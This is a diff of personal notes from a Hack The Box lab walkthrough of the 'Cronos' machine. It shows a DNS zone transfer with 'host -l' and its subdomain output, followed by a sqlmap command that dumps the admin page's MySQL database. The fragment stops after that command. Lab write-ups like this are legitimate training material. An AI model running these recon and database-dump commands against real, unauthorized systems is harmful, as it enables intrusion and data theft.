@@ -41,7 +41,7 @@ dnsrecon tool doesn't seem to get a response from server, reset?
 I can use nslookup to that ns and get responses
 Seems like the dnsrecon should be getting responses, and I can't reset the server because it says it's under maintenance. That's probably the right way though. Try later. 
 Host command worked for zone transfer.
-'''
+```
 pat@kali:~/Desktop/Cert_Prep/htb/Linux/Cronos/exploits$ host -l 10.10.10.13 10.10.10.13
 Using domain server:
 Name: 10.10.10.13
@@ -58,12 +58,12 @@ cronos.htb has address 10.10.10.13
 admin.cronos.htb has address 10.10.10.13
 ns1.cronos.htb has address 10.10.10.13
 www.cronos.htb has address 10.10.10.13
-'''
+```
 
 
 # Access
 If I set my dns to use 10.10.10.13 I can then go to admin.cronos.htb and get a different web page. No idea if this is what the goal is but given that it's an http page, probably.   
-Intercept with burp and run sqlmap   
+Intercept with burp and run sqlmap    
 ```
 pat@kali:~/Desktop/Cert_Prep/htb/Linux/Cronos/exploits$ sqlmap -r burp_intercept.txt --dbms=mysql --dump
 ...
